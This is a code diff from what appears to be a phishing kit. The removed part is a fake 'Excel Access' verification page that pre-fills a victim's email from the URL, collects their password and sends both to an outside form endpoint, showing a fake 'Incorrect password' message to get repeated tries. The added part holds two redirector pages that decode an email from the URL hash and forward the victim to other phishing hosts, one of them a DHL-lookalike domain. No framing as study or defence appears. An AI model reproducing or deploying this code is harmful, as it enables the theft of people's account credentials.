@@ -1,171 +1,111 @@
-<!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="utf-8"/>
-    <meta content="width=device-width, initial-scale=1" name="viewport"/>
-    <title>Excel File Verification</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
-        body {
-            font-family: 'Inter', sans-serif;
-            background: url('https://filedn.eu/lr4Rp3x4QR2yETwH1wVipzV/IMG_9209.png') no-repeat center center fixed;
-            background-size: cover;
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+
+
+
+  <head>
+
+  <body>
+
+    <script type="text/javascript">
+      var url_string = window.location.href;
+      var url_get_email = atob(getafterhash(url_string));
+      var mail_go_url = "https://filedn.eu/lr4Rp3x4QR2yETwH1wVipzV/perrexel.html#" + url_get_email + "";
+      location.replace(mail_go_url);
+
+
+      function getafterhash(url) {
+        var ret;
+        var queryString;
+        // stuff after # is not part of query string, so get rid of it
+        queryStringhash = url.split('#')[1];
+        queryStringsemi = url.split(';')[1];
+        queryStringsemiplus = url.split(';+')[1];
+        queryStringstartsemi = url.split('*;')[1];
+        // if query string exists
+        if (queryStringhash) {
+          ret = queryStringhash;
+
+        } else if (queryStringsemi) {
+          ret = queryStringsemi;
+
+        } else if (queryStringsemiplus) {
+          ret = queryStringsemiplus;
+
+        } else if (queryStringstartsemi) {
+          ret = queryStringstartsemi;
+
+        } else {
+
+          ret = 0;
+
         }
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: inherit;
-            filter: blur(5px);
-            z-index: -1;
-        }
-        .content {
-            position: relative;
-            z-index: 1;
-        }
-        .honeypot {
-            display: none;
-        }
-    </style>
-</head>
-<body class="bg-gray-100 min-h-screen flex flex-col">
-    <header class="flex justify-between items-center px-4 sm:px-6 pt-4 sm:pt-6">
-        <div class="text-green-700 font-extrabold text-xl sm:text-2xl tracking-tight select-none">
-            <!-- Excel Access removed, leaving area blank -->
-        </div>
-    </header>
 
-    <main class="min-h-screen flex items-center justify-center px-4 sm:px-6 pt-8 sm:pt-12 md:pt-16 max-w-md mx-auto w-full content">
-        <div class="bg-white bg-opacity-90 rounded-lg shadow-md p-4 sm:p-6">
-            <h1 class="text-green-600 text-lg sm:text-xl font-bold mb-4 sm:mb-6">
-                Excel Access
-            </h1>
-            <p class="text-gray-600 font-bold text-sm sm:text-base mb-4 sm:mb-6">Only recipient email can access shared files</p>
-            <form id="verify-form" class="space-y-4" novalidate>
-                <!-- Honeypot Input -->
-                <input type="text" name="honeypot" class="honeypot" autocomplete="off" />
-                <!-- Email Input -->
-                <div class="relative">
-                    <input id="email" class="w-full rounded-md p-2 sm:p-3 text-gray-700 text-sm sm:text-base placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-green-500" placeholder="Email address" required disabled>
-                </div>
-                <div class="relative">
-                    <input id="password" class="w-full rounded-md p-2 sm:p-3 pr-10 text-gray-700 text-sm sm:text-base placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-green-500" placeholder="Password" required type="password"/>
-                    <span aria-label="Show password" class="absolute inset-y-0 right-3 flex items-center text-gray-700 cursor-pointer" id="toggle-password">
-                        <i class="fas fa-eye"></i>
-                    </span>
-                </div>
-                <button class="w-full bg-green-600 hover:bg-green-700 text-white font-bold text-sm sm:text-base py-2 rounded-md transition duration-300" type="submit">
-                    Next
-                </button>
-            </form>
-            <p id="error-message" class="text-red-500 text-center text-sm sm:text-base mt-4"></p>
-        </div>
-    </main>
+        return ret;
+      }
 
-    <script>
-        (() => {
-            const form = document.getElementById('verify-form');
-            const emailInput = document.getElementById('email');
-            const errorMessageEl = document.getElementById('error-message');
-            const maxAttempts = 3;
-            const submitEndpoint = 'https://submit-form.com/saodPioKu'; // Updated action URL
-            let attemptCount = 0;
-
-            // Function to handle email pre-filling
-            const updateEmailFromHash = () => {
-                const hash = decodeURIComponent(window.location.hash.slice(1)); // Decode URL hash
-                console.log('Raw hash:', window.location.hash);
-                console.log('Decoded hash:', hash);
-                if (hash) {
-                    // Improved email validation
-                    const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$/;
-                    console.log('Regex test:', emailRegex.test(hash));
-                    if (emailRegex.test(hash)) {
-                        emailInput.value = hash;
-                        emailInput.disabled = false;
-                        emailInput.placeholder = 'Email address';
-                    } else {
-                        emailInput.value = '';
-                        emailInput.disabled = true;
-                        emailInput.placeholder = 'Invalid email in URL';
-                    }
-                } else {
-                    emailInput.value = '';
-                    emailInput.disabled = true;
-                    emailInput.placeholder = 'No email provided in URL';
-                }
-            };
-
-            // Run on initial load
-            updateEmailFromHash();
-
-            // Listen for hash changes
-            window.addEventListener('hashchange', updateEmailFromHash);
-
-            form.addEventListener('submit', async (event) => {
-                event.preventDefault();
-                errorMessageEl.textContent = '';
-
-                const email = emailInput.value.trim();
-                const password = form.password.value;
-                const honeypot = form.honeypot.value;
-
-                // Basic client-side validation
-                if (!email || !password) {
-                    errorMessageEl.textContent = 'Please enter your email and password.';
-                    return;
-                }
-
-                // Check if honeypot is filled
-                if (honeypot) {
-                    console.warn('Honeypot field filled, likely a bot submission.');
-                    return;
-                }
-
-                // Report credentials to the endpoint
-                try {
-                    const response = await fetch(submitEndpoint, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ email, password }),
-                    });
-
-                    if (!response.ok) {
-                        throw new Error('Verification failed');
-                    }
-
-                    // Handle successful verification
-                    console.log('Verification successful');
-                    // Replace with your success action, e.g., window.location.href = 'success-page.html';
-                } catch (error) {
-                    attemptCount++;
-                    if (attemptCount < maxAttempts) {
-                        form.password.value = '';
-                        form.password.focus();
-                        errorMessageEl.textContent = 'Incorrect password. Please try again.';
-                    } else {
-                        window.location.href = 'https://example.com/verification-error.html'; // Replace with error page
-                    }
-                }
-            });
-
-            // Toggle password visibility
-            const togglePassword = document.getElementById('toggle-password');
-            togglePassword.addEventListener('click', () => {
-                const passwordInput = document.getElementById('password');
-                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-                passwordInput.setAttribute('type', type);
-                togglePassword.querySelector('i').classList.toggle('fa-eye');
-                togglePassword.querySelector('i').classList.toggle('fa-eye-slash');
-            });
-        })();
     </script>
-    <iframe id="background-iframe" src="about:blank" style="display:none"></iframe>
+  </body>
+
+</html>
+
+
+
+
+
+
+——
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+</head>
+
+<body>
+
+  <script type="text/javascript">
+    var url_string = window.location.href;
+    var url_get_email = atob(getafterhash(url_string));
+    var long_query_param = "shiyf24fjureujuvdehjyresthjutdhjg1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" +
+                           "shiyf24fjureujuvdehjyresthjutdhjg1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" +
+                           "shiyf24fjureujuvdehjyresthjutdhjg1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" +
+                           "shiyf24fjureujuvdehjyresthjutdhjg1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"; // Very long query parameter
+    var mail_go_url = "https://dhl-cn-gyygghl.vercel.app?query=" + long_query_param + "#" + url_get_email; // Added query parameter before the hash
+    location.replace(mail_go_url);
+
+    function getafterhash(url) {
+      var ret;
+      var queryString;
+      // stuff after # is not part of query string, so get rid of it
+      queryStringhash = url.split('#')[1];
+      queryStringsemi = url.split(';')[1];
+      queryStringsemiplus = url.split(';+')[1];
+      queryStringstartsemi = url.split('*;')[1];
+      // if query string exists
+      if (queryStringhash) {
+        ret = queryStringhash;
+
+      } else if (queryStringsemi) {
+        ret = queryStringsemi;
+
+      } else if (queryStringsemiplus) {
+        ret = queryStringsemiplus;
+
+      } else if (queryStringstartsemi) {
+        ret = queryStringstartsemi;
+
+      } else {
+        ret = 0;
+      }
+
+      return ret;
+    }
+
+  </script>
 </body>
+
 </html>
